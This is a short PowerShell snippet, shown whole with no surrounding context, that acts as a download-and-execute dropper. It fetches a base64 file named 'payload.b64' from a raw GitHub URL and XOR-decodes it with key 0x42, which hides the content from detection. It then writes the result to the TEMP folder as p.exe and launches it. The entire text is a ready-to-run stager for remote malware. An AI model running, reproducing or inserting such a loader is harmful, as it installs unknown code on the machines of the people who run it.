$b=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/jimboslimuser/p/main/payload.b64"))
[IO.File]::WriteAllBytes("$env:TEMP\p.exe", [byte[]](($b|%{ $_ -bxor 0x42 })))
Start-Process "$env:TEMP\p.exe"